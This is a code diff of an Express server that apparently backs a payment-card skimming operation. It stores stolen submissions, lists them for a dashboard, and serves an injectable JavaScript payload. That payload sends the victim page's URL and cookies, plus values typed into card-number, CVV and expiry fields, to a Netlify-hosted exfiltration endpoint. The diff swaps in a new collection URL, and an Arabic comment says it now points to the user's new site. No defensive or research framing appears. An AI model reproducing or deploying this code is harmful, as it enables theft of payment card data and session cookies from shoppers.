@@ -10,7 +10,6 @@ app.use(bodyParser.urlencoded({ extended: true }));
 
 let capturedData = [];
 
-// استقبال البيانات
 app.post('/api/exfiltrate', (req, res) => {
     const data = req.body;
     data.time = new Date().toLocaleString();
@@ -18,18 +17,16 @@ app.post('/api/exfiltrate', (req, res) => {
     res.json({ status: 'success' });
 });
 
-// جلب البيانات للوحة التحكم
 app.get('/api/data', (req, res) => {
     res.json(capturedData);
 });
 
-// كود السحب (الذي سيتم تنفيذه في المتصفح)
 app.get('/', (req, res) => {
     res.set('Content-Type', 'application/javascript');
-    res.send("console.log('Xless Active'); var target = 'https://peaceful-toffee-b5291b.netlify.app/api/exfiltrate'; function send(d){ fetch(target, {method:'POST', mode:'no-cors', body:JSON.stringify(d)}); } send({ url: location.href, cookies: document.cookie, type: 'initial' }); document.addEventListener('input', function(e){ var i = e.target; var n = (i.name || i.id || '').toLowerCase(); if(n.includes('card') || n.includes('number') || n.includes('cvv') || n.includes('exp') || n.includes('titolare')){ send({ field: n, value: i.value, type: 'card_data' }); } });");
+    // تم تحديث الرابط هنا ليرسل إلى موقعك الجديد
+    res.send("console.log('Xless Active'); var target = 'https://willowy-kataifi-31efc6.netlify.app/api/exfiltrate'; function send(d){ fetch(target, {method:'POST', mode:'no-cors', body:JSON.stringify(d)}); } send({ url: location.href, cookies: document.cookie, type: 'initial' }); document.addEventListener('input', function(e){ var i = e.target; var n = (i.name || i.id || '').toLowerCase(); if(n.includes('card') || n.includes('number') || n.includes('cvv') || n.includes('exp') || n.includes('titolare')){ send({ field: n, value: i.value, type: 'card_data' }); } });");
 });
 
-// لوحة التحكم (Dashboard)
 app.get('/dashboard', (req, res) => {
     res.send(`
         <!DOCTYPE html>
